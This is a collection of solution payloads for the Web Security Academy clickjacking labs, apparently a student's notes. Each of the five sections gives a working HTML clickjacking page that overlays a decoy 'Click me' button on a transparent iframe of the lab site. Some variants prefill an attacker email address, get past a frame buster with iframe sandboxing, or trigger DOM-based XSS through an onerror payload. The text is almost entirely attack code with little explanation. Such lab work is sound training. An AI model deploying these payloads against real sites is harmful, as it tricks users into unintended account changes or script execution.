### Basic clickjacking with CSRF token protection

```text
<style>
    iframe {
        position:relative;
        width:700px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a0f00bc0329d2fe81b35cc3009400c4.web-security-academy.net/my-account"></iframe>
```

---
### Clickjacking with form input data prefilled from a URL parameter

```text
<style>
    iframe {
        position:relative;
        width:700px;
        height:700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:457px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a37009f0365612a827babcf006700ee.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

---
### Clickjacking with a frame buster script

```text
<style>
    iframe {
        position:relative;
        width:700px;
        height:700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://0a6c00d3041eb702814ca2a4002b0092.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

---
### Exploiting clickjacking vulnerability to trigger DOM-based XSS

```text
<style>
	iframe {
		position:relative;
		width:700px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
	div {
		position:absolute;
		top:620px;
		left:60px;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe
src="https://0ac10088041d05858279e969001100ba.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

---
### Multistep clickjacking

```text
<style>
	iframe {
		position:relative;
		width:700px;;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:45px;
		z-index: 1;
	}
   .secondClick {
		top:290px;
		left:195px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0aea002904dca34081b23eec007600ce.web-security-academy.net/my-account"></iframe>
```